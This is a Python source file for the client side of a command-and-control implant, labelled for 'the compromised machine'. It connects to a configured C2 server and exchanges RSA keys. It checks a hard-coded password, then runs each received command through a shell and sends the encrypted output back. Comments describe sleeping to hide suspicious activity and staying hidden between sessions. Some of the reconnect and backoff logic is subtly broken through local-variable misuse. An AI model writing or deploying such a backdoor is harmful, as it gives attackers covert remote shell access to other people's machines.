# client.py - For the compromised machine

import socket
import subprocess
import time

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

import configuration as config  # Import configuration file

# CONSTANTS & GLOBALS
ADDRESS = (config.SERVER_ADDR, config.SERVER_PORT)
CONNECTION_TIMEOUT = 10
MAX_SLEEP = 3 * 60  # Upper bound of three minutes
sleep_sec = 10

########################
# CODE BEGINS
########################

# Sleep to hide suspicious activity UNCOMMENT IN FINAL VERSION
# time.sleep(sleep_sec) UNCOMMENT IN FINAL VERSION

# Create a socket to connect to the server
connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection_socket.settimeout(CONNECTION_TIMEOUT)
connection_socket.connect(ADDRESS)

##### Function Setup #####

def is_socket_connected():
    ''' Determine if the socket is currently connected. '''
    try:
        unix_exit_code = connection_socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
        print(unix_exit_code)
        return True if unix_exit_code == 0 else False
    except socket.error as e:
        print("error: ", e)
        return False  # Catch any errors from checking the socket status

def sleep_or_connect():
    """
    Check to see if the server is listening for connections. If not, go to
    sleep.
    """
    while not is_socket_connected():
        try:
            print("is connected?: ", is_socket_connected())
            time.sleep(2)
            connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection_socket.settimeout(CONNECTION_TIMEOUT)
            connection_socket.connect(ADDRESS)
        except socket.timeout:
            # Sleep for twice the previous amound and try again
            sleep_sec = min(sleep_sec * 2, MAX_SLEEP)
            time.sleep(sleep_sec)

def receive_or_sleep():
    """
    Check if a message was sent. Sleep (but not for too long) if the server took
    a while (> 10 seconds) to send.
    """
    cmd = ""
    while cmd == "":
        try:
            cmd = connection_socket.recv(config.PAYLOAD_SIZE)
        except:
            print("going to sleep!")
            time.sleep(CONNECTION_TIMEOUT)
            print("woke up!")
    return cmd       

# Create RSA key pair
client_key = RSA.generate(config.KEY_SIZE)
client_public_key = client_key.publickey()
decrypt_cipher = PKCS1_OAEP.new(client_key)
encrypt_cipher = None

def encoded_encrypt_and_send(encoded_message):
    encrypted_message = encrypt_cipher.encrypt(encoded_message)
    connection_socket.send(encrypted_message)

def decrypt(encrypted_message):
    message = decrypt_cipher.decrypt(encrypted_message).decode()
    return message

##### Main Loop #####

while True:
    sleep_or_connect()

    # Send client public key to server
    connection_socket.send(client_public_key.exportKey())

    # Receive server's public key
    server_public_key = RSA.importKey(connection_socket.recv(config.PAYLOAD_SIZE))
    encrypt_cipher = PKCS1_OAEP.new(server_public_key)

    # Check that it's the correct server
    encrypted_message = receive_or_sleep()
    decrypted_message = decrypt(encrypted_message)
    # print("decrypted_message: ", decrypted_message)
    if decrypted_message != "c2password":
        connection_socket.close()
        time.sleep(MAX_SLEEP)
    else:
        break

# Client REPL loop - run the interactive shell
while True:
    # Receive command from the C2 server
    decrypted_command = decrypt(receive_or_sleep())
    if decrypted_command == "exit" or decrypted_command == "hangup":
        # Go back into the sleep cycle, stay hidden
        connection_socket.close()
        time.sleep(MAX_SLEEP)
        sleep_or_connect()
        continue
    # Execute the command
    shell_output = subprocess.run(decrypted_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True).stdout
    # Let the server know the command ran, even if there's no output 
    if shell_output == "".encode():
        shell_output = " ".encode()
    # Send the results to the server
    encoded_encrypt_and_send(shell_output)
